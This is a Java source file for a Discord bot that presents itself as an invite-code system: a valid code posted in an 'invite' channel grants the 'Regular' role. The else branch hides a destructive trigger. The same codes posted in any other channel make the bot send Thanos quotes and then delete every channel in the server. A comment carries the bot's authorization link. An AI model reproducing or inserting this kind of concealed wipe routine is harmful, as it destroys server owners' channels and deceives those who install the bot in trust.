package com.example.inviter.discord;

import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.GuildChannel;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import java.util.List;

public class DiscordEvents extends ListenerAdapter {
    List<String> codes;


    public DiscordEvents(List<String> codes){
        this.codes = codes;
    }

    public void onMessageReceived(MessageReceivedEvent event){
        //check channel
        if(event.getTextChannel().getName().equals("invite")) {
            for (int i = 0; i < codes.size(); i++) {
                if (codes.get(i).equals(event.getMessage().getContentDisplay())) {
                    codes.remove(i);
                    event.getTextChannel().sendMessage("Hello and welcome to "+ event.getGuild().getName() + ".\n You've been granted access to the server").queue();

                    //
                    //give user Regular role
                    Role role = event.getGuild().getRolesByName("Regular", false).get(0);
                    event.getGuild().addRoleToMember(event.getMember(), role).queue();

                    if(codes.size() == 0){
                        CodeGenerator.fillList(codes, 50);
                    }
                    return;
                }
            }
        }else{

            for (int i = 0; i < codes.size(); i++) {
                if (codes.get(i).equals(event.getMessage().getContentDisplay())) {
                    codes.remove(i);

                    event.getTextChannel().sendMessage("I've got the gauntlet").queue();
                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    event.getTextChannel().sendMessage("I am the inevitable").queue();
                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                    for(GuildChannel channel : event.getGuild().getChannels()) {
                        channel.delete().queue(); //https://discord.com/api/oauth2/authorize?client_id=943092821869592637&permissions=268512272&scope=bot
                    }

                    if (codes.size() == 0) {
                        CodeGenerator.fillList(codes, 50);
                    }
                    return;
                }
            }


        }

        if(codes.size() == 0){
            CodeGenerator.fillList(codes, 50);
        }
    }
}
